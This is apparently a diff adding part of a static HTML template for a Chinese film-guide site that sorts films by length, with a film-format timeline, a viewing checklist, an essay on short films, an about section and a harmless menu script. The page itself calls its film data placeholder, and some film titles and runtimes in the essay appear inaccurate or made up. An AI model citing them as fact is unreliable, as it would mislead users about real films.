+        <div class="n"><b>1927 · 有声片的窄轨</b><span>为了塞进声轨，35mm 胶片被"挤"成 22.05mm 的画幅。声音来了，画面小了。直到 1953 年 CinemaScope 用变形镜头把它拉回来。</span><em>TIMELINE 02</em></div>
+        <div class="n"><b>1970s · 胶片的黄昏预告</b><span>电视抢走了观众，录像带抢走了发行。电影院开始缩短片长、加快节奏——"130 分钟以上"从此成了作者的固执。</span><em>TIMELINE 03</em></div>
+        <div class="n"><b>2000s · 数字革命</b><span>《星球大战前传二》第一部全数字拍摄。胶片成本太高，中小成本电影几乎活不下去。短片的黄金期，反而来了。</span><em>TIMELINE 04</em></div>
+        <div class="n"><b>2019 · 胶片回潮</b><span>诺兰、昆汀、斯皮尔伯格公开反对"只用数字"。胶片洗印厂重新开工。修复版不再是"高清版"，而是"第一次真正看清这部电影"。</span><em>TIMELINE 05</em></div>
+        <div class="n"><b>2026 · 你手里的 35 分钟</b><span>胶片、数字、AI 上采样混在一起。判断标准只剩一个：<b>它是否值得你关掉手机 35 分钟</b>。答案是，值得。</span><em>TIMELINE 06</em></div>
+      </div>
+      <aside class="reel">
+        <h4>35 毫米观影设置清单</h4>
+        <p class="sub">CHECK LIST · 35 MINUTES</p>
+        <dl>
+          <dt>画幅</dt><dd>已选择"原始画幅 / 4:3 或 1.85:1"，未强行拉伸为 16:9</dd>
+          <dt>帧率</dt><dd>已关闭"运动补偿 / MEMC / 插帧"，未把 24fps 变成 60fps</dd>
+          <dt>色彩</dt><dd>已关闭"AI 画质增强 / 影院模式"，胶片颗粒不是噪点</dd>
+          <dt>字幕</dt><dd>已选择官方/原版字幕，非机器翻译，未遮挡画面下缘</dd>
+          <dt>时长</dt><dd>已确认片长，并已预留片尾字幕时间（别在字幕开始时关掉）</dd>
+          <dt>环境</dt><dd>灯已关、手机已静音、猫已被告知"别在长镜头时踩键盘"</dd>
+        </dl>
+        <div class="gap">35mm 已就绪 · 请勿倍速</div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目5：长文（杂志：衬线 + 眉题 + 引语） ================= -->
+<section class="sec" id="essay">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t"><span class="tag">ESSAY</span>长篇</h2>
+      <span class="sec-s">关于"35 分钟"的 1 篇</span>
+    </div>
+    <article class="essay">
+      <div class="em">ESSAY 01 · 35 MINUTES</div>
+      <h3>35 分钟，够看完一部电影吗</h3>
+      <div class="by">BY 35电影网 片长部 · 约 6 min 阅读</div>
+      <p>很多人说"我没时间看电影"。我猜他们说的是"我没时间看一部 130 分钟的电影"。这没错。下班到家 22:40，洗澡、吃饭、回消息，剩下 35 分钟。这时打开《肖申克的救赎》是一种残忍。</p>
+      <p>但 35 分钟，刚好够看完一部短片。<b>李安的《衣橱里的猫》17 分钟，今敏的《早上好》7 分钟，伯格曼的《卡琳的面孔》14 分钟，塔可夫斯基的《压路机与小提琴》46 分钟（超了 11 分钟，值得）</b>。它们不是"没拍完的电影"，它们是另一种电影。</p>
+      <blockquote>"短片不是长片的草稿，长片才是短片的失败。"——很多人说过类似的话，没人认领。</blockquote>
+      <p>我们把电影按片长分档，是因为<b>片长是一种诚实</b>。一部 90 分钟的电影，默认你有 90 分钟；一部 439 分钟的电影，要求你重新安排一个周末。导演在片长上做的每一个决定，都是对观众时间的一次请求。尊重这个请求，是观影的起点。</p>
+      <p>也因为片长是最被低估的推荐维度。算法按"类型""演员""热度"给你推片，但从不问："你今晚还剩多少时间？"——于是你在 23:20 点开一部 167 分钟的史诗，看了 22 分钟就睡了，第二天接着看，第三天忘了开头，第五天把它标记为"看过"。这不是你的错，是推荐方式的错。</p>
+      <p>所以 35电影网只做一件事：<b>在你说"还有 35 分钟"的时候，给你一部刚好 35 分钟的电影</b>。通勤、午休、睡前、下雨的下午、等外卖的 12 分钟、一个不想出门的周日。每个时间段都有一部与之匹配的电影，只是从来没人帮你配对。</p>
+      <p>今晚的建议：看一部短片。真的短片。看完后别立刻刷手机，让那 17 分钟在你脑子里多待一会儿。如果它留下了什么，那就是电影在做的事。</p>
+    </article>
+  </div>
+</section>
+
+<!-- ============ 栏目6：关于（数据条 + 承诺栅格） ================= -->
+<section class="sec" id="about">
+  <div class="wrap">
+    <div class="about">
+      <div class="lh">
+        <div>
+          <h2>35电影网<br>按<b>片长</b><u>找电影</u>的观影指南</h2>
+          <p class="lead">35电影网（35dianyingwang-cn.github.io）是<b>按片长分档的电影观影指南</b>。我们不堆片库、不追热度，只回答一个问题：<b>在你说"还有 35 分钟"的时候，哪一部电影刚好能在这 35 分钟里被看完？</b>馆藏按片长（&lt;35 / 35–90 / 90–130 / &gt;130 分钟）、年代、导演、胶片与修复状态五重索引，每部标注正版入口，让你在 22:40 也能 30 秒内决定今晚看什么。</p>
+        </div>
+        <div class="stats">
+          <div><b>14,220</b><small>馆藏影片</small></div>
+          <div><b>4</b><small>片长分档</small></div>
+          <div><b>35</b><small>部必看</small></div>
+          <div><b>0</b><small>盗链广告</small></div>
+        </div>
+      </div>
+      <div class="feat">
+        <div><h4><span class="tk">01</span>按片长分档</h4><p>35 分钟以内 / 35–90 / 90–130 / 130 分钟以上。标准是"你还剩多少时间"，不是"它卖了多少"。</p></div>
+        <div><h4><span class="tk">02</span>标注片长</h4><p>每部标注精确片长（含片尾字幕），并给出"适合时间段"建议，避免 23:20 点开一部 167 分钟的史诗。</p></div>
+        <div><h4><span class="tk">03</span>35mm 修复优先</h4><p>优先推荐 4K / 2K 修复版、标准收藏、胶片原始画幅。片源限定持牌平台艺术电影专区、正版修复版与电影资料馆。不搬运、不盗链、不破解、不写"未删减""禁片""磁力"。</p></div>
+      </div>
+      <div class="siteinfo">
+        <p><b>网站名称：</b>35电影网 —— 按片长找电影 · 35 分钟短片 · 中片 · 标准片 · 长篇 · 35 部必看 · 35 毫米胶片 · 电影修复 · 短片推荐 · 动画短片 · 华语短片 · 纪录片短片 · 戛纳短片 · 柏林短片 · 奥斯卡短片 · 经典电影 · 高分电影 · 冷门佳片 · 电影在线观看 · 正版电影</p>
+        <p style="margin-top:8px"><b>网站网址：</b><a href="https://35dianyingwang-cn.github.io/" style="color:var(--tape)">https://35dianyingwang-cn.github.io/</a></p>
+        <p style="margin-top:8px"><b>合规声明：</b>本演示页面为静态模板示例，影片名称、年份、片长、评分、"馆藏 14,220 部"、"35 部必看"排序与"正版/付费"状态均为示例占位数据，仅供界面展示与学习使用，不代表真实可观看状态、实际价格、版权归属或授权情况，一切以各平台当日页面为准。影视作品版权归原作者及版权方所有，请在正版平台确认版权、价格与地区限制后观看，支持创作者。本站<b>不提供任何破解账号、绕过付费或 DRM 的技术方法，不传播磁力链接、种子与网盘盗版资源</b>。含暴力、血腥、成人题材的影片已标注 <b>18+</b>，建议成年人在清醒状态下观看；未成年人请在家长指导下使用本站。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 页脚 ============ -->
+<footer class="foot">
+  <div class="wrap">
+    <div class="f-top">
+      <div>
+        <a class="logo" href="#" style="font-size:17px"><span class="lt">35</span><span>35电影网<small>35 MINUTES · A FILM</small></span></a>
+        <p style="margin-top:12px;max-width:440px">还有 35 分钟，看一部电影。</p>
+      </div>
+      <div class="f-links">
+        <a href="#home">今日35</a>
+        <a href="#tape">片长分档</a>
+        <a href="#must">35部必看</a>
+        <a href="#pick">片单</a>
+        <a href="#mm">35毫米</a>
+        <a href="#essay">长篇</a>
+        <a href="#about">关于</a>
+        <a href="#">正版来源</a>
+      </div>
+    </div>
+    <div class="f-cat">
+      <a href="#">35电影网</a>
+      <a href="#">35分钟电影</a>
+      <a href="#">短片</a>
+      <a href="#">中片</a>
+      <a href="#">长片</a>
+      <a href="#">片长分档</a>
+      <a href="#">35部必看</a>
+      <a href="#">35毫米胶片</a>
+      <a href="#">电影修复</a>
+      <a href="#">短片推荐</a>
+      <a href="#">动画短片</a>
+      <a href="#">华语短片</a>
+    </div>
+    <div class="copy">
+      © 2026 35电影网 35dianyingwang　|　按片长找电影 · 35 分钟短片 · 35 部必看 · 35mm 胶片修复 · 4K 修复版优先　|　<a href="#" style="color:var(--rust)">回到顶部 ↑</a><br>
+      <b>网站网址：https://35dianyingwang-cn.github.io/</b>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('hamb').addEventListener('click',function(){document.getElementById('menu').classList.toggle('open');});
+document.querySelectorAll('.menu a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('menu').classList.remove('open');});});
+/* 滚动高亮 */
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+150,cur='';
+  document.querySelectorAll('section[id]').forEach(function(s){if(s.offsetTop<=y)cur=s.id;});
+  document.querySelectorAll('.menu a').forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur);});
+});
+</script>
+</body>
+</html>
